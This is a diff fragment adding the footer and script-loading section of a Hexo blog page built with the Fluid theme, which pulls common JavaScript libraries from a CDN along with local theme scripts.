+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
